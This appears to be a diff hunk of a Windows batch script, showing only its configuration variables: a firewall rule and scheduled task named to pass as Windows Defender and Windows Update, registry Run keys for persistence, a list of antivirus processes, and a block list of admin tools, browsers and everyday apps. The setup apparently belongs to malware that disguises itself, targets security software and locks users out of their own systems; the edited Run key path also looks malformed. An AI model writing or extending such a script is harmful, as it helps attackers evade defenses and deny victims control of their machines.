@@ -6,8 +6,7 @@ setlocal enabledelayedexpansion
 :: ==========================================
 set "FIREWALL_RULE_NAME=Windows Defender Update"
 set "TASK_SCHEDULER_NAME=WindowsUpdate_Check"
-set "REG_RUN_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-set "REG_STARTUP_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Startup Approved\Programs"
+set "REG_RUN_KEY=HKCU\Software\Microsoft\CurrentVersion\Run"
 set "ANTIVIRUS_NAMES=defender.exe,MsMpEng.exe,securityservice.exe,nisum.exe,msecom.exe,msmpeng.exe,msascui.exe,msmpsvc.exe,SecurityHealthSystray.exe,SecurityHealth.exe,svchost_k.exe,svchost_x.exe,explorer_new.exe"
 set "FIREWALL_BLOCK_LIST=cmd.exe,powershell.exe,taskmgr.exe,regedit.exe,notepad.exe,calc.exe,chrome.exe,firefox.exe,msedge.exe,winword.exe,excel.exe,outlook.exe,onedrive.exe,spotify.exe,slack.exe,teams.exe,discord.exe,steam.exe,epicgameslauncher.exe,bluestacks.exe,xboxapp.exe"
 
